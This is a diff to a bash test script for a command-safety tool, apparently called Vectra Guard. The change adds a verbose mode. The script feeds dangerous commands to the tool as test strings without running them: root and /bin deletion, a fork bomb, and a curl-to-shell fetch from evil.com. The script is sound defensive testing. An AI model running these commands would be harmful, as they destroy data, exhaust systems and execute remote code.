@@ -1,8 +1,16 @@
 #!/bin/bash
 # Quick Manual Test Script for Vectra Guard
 # Tests detection of dangerous commands (safe - never executes)
+#
+# Usage: ./test-manual.sh [--verbose]
 
 set -euo pipefail
+
+# Check for verbose flag
+VERBOSE=false
+if [ "${1:-}" = "--verbose" ]; then
+    VERBOSE=true
+fi
 
 GREEN='\033[0;32m'
 RED='\033[0;31m'
@@ -19,37 +27,65 @@ echo ""
 
 # Test 1: Incident scenario
 echo -e "${BLUE}Test 1: Incident Scenario (rm -r /*)${NC}"
-if echo "rm -r /*" | ./vectra-guard validate /dev/stdin 2>&1 | grep -qi "DANGEROUS_DELETE_ROOT\|critical"; then
+output=$(echo "rm -r /*" | ./vectra-guard validate /dev/stdin 2>&1 || true)
+if echo "$output" | grep -qi "DANGEROUS_DELETE_ROOT\|critical"; then
     echo -e "${GREEN}✓ DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "$output" | grep -i "DANGEROUS_DELETE_ROOT\|critical" | head -1
+    fi
 else
     echo -e "${RED}✗ NOT DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "Output: $output"
+    fi
 fi
 echo ""
 
 # Test 2: System directory
 echo -e "${BLUE}Test 2: System Directory Deletion (rm -rf /bin)${NC}"
-if echo "rm -rf /bin" | ./vectra-guard validate /dev/stdin 2>&1 | grep -qi "DANGEROUS_DELETE_ROOT\|critical"; then
+output=$(echo "rm -rf /bin" | ./vectra-guard validate /dev/stdin 2>&1 || true)
+if echo "$output" | grep -qi "DANGEROUS_DELETE_ROOT\|critical\|POLICY_DENYLIST"; then
     echo -e "${GREEN}✓ DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "$output" | grep -i "DANGEROUS_DELETE_ROOT\|critical\|denylist" | head -1
+    fi
 else
     echo -e "${RED}✗ NOT DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "Output: $output"
+    fi
 fi
 echo ""
 
 # Test 3: Fork bomb
 echo -e "${BLUE}Test 3: Fork Bomb${NC}"
-if echo ":(){ :|:& };:" | ./vectra-guard validate /dev/stdin 2>&1 | grep -qi "FORK_BOMB\|critical"; then
+output=$(echo ":(){ :|:& };:" | ./vectra-guard validate /dev/stdin 2>&1 || true)
+if echo "$output" | grep -qi "FORK_BOMB\|critical\|POLICY_DENYLIST"; then
     echo -e "${GREEN}✓ DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "$output" | grep -i "FORK_BOMB\|critical\|denylist" | head -1
+    fi
 else
     echo -e "${RED}✗ NOT DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "Output: $output"
+    fi
 fi
 echo ""
 
 # Test 4: Network attack
 echo -e "${BLUE}Test 4: Network Attack (curl | sh)${NC}"
-if echo "curl http://evil.com/script.sh | sh" | ./vectra-guard validate /dev/stdin 2>&1 | grep -qi "PIPE_TO_SHELL\|high\|critical"; then
+output=$(echo "curl http://evil.com/script.sh | sh" | ./vectra-guard validate /dev/stdin 2>&1 || true)
+if echo "$output" | grep -qi "PIPE_TO_SHELL\|high\|critical\|POLICY_DENYLIST"; then
     echo -e "${GREEN}✓ DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "$output" | grep -i "PIPE_TO_SHELL\|high\|critical\|denylist" | head -1
+    fi
 else
     echo -e "${RED}✗ NOT DETECTED${NC}"
+    if [ "$VERBOSE" = "true" ] || [ "${1:-}" = "--verbose" ]; then
+        echo "Output: $output"
+    fi
 fi
 echo ""
 
